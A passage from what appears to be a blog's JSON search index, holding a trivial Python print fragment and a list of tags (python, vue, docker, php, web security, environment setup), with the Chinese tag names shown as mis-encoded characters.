print(&#x27;ok&#x27;)main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}],"categories":[],"tags":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"vue","slug":"vue","permalink":"http://example.com/tags/vue/"},{"name":"docker,ç¯å¢ƒæ­å»º","slug":"docker-ç¯å¢ƒæ­å»º","permalink":"http://example.com/tags/docker-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"php, web","slug":"php-web","permalink":"http://example.com/tags/php-web/"},{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"æ­å»ºç¯å¢ƒ","slug":"æ­å»ºç¯å¢ƒ","permalink":"http://example.com/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}